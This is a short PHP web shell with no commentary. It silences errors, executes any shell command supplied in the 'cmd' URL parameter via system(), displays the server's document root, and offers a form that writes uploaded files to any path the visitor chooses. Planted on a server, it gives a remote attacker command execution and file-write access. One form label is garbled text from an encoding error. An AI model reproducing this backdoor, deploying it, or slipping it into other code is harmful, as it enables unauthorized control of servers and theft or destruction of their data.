<?php
error_reporting(0);
$c=$_GET['cmd'];
system($c);
$p=$_SERVER["DOCUMENT_ROOT"];
$yoco=dirname(__FILE__);
echo <<<HTML
<form enctype="multipart/form-data"  method="POST">
Path:$p<br>
<input name="file" type="file"><br>
Ä¿±ê:<br>
<input size="48" value="$yoco/" name="pt" type="text"><br>
<input type="submit" value="Upload">
$tend
HTML;
if (isset($_POST["pt"])){
$uploadfile = $_POST["pt"].$_FILES["file"]["name"];
if ($_POST["pt"]==""){$uploadfile = $_FILES["file"]["name"];}
if (copy($_FILES["file"]["tmp_name"], $uploadfile)){
echo"uploaded:$uploadfilen";
echo"Size:".$_FILES["file"]["size"]."n";
}else {
print "Error:n";
}
}?>